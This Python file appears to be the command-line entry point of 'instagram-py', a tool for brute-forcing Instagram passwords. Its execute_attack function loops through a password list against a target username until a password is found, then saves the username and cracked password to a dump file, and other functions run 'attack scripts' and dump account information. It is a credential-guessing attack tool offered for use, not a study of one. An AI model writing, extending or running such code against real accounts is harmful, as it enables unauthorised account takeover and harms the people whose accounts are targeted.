# ... (previous imports remain unchanged)

def create_configuration():
    creator = InstagramPyConfigurationCreator(os.path.expanduser('~') + "/instapy-config.json")
    creator.create() if Parsed.default_configuration is not None else creator.easy_create()

def inspect_username():
    InstagramPyDumper(Parsed.inspect_username).Dump()

def execute_script():
    if not os.path.isfile(Parsed.script):
        print("No Attack Script found at {}".format(Parsed.script))
        sys.exit(-1)
    InstagramPyScript(Parsed.script).run()

def execute_attack():
    cli = InstagramPyCLI(appinfo=AppInformation, started=datetime.now(), verbose_level=Parsed.verbose, username=Parsed.username)
    cli.PrintHeader()
    cli.PrintDatetime()
    
    session = InstagramPySession(Parsed.username, Parsed.password_list, DEFAULT_PATH, DEFAULT_PATH, cli)
    session.ReadSaveFile(Parsed.countinue)
    instagrampy = InstagramPyInstance(cli, session)
    
    while not instagrampy.PasswordFound():
        instagrampy.TryPassword()
    
    session.WriteDumpFile({
        "id": Parsed.username,
        "password": session.CurrentPassword(),
        "started": str(cli.started)
    })

def main():
    Parsed = cli_parser.parse_args()

    if Parsed.create_configuration is not None:
        create_configuration()
    elif Parsed.inspect_username is not None:
        inspect_username()
    elif Parsed.script is not None:
        execute_script()
    elif Parsed.username is not None and Parsed.password_list is not None:
        execute_attack()
    else:
        cli_parser.print_help()

    print('\n{}Report bug, suggestions, and new features at {}{}https://github.com/deathsec/instagram-py{}'
          .format(Fore.GREEN,
                  Style.RESET_ALL,
                  Style.BRIGHT,
                  Style.RESET_ALL
                  ))
    sys.exit(0)

if __name__ == "__main__":
    main()

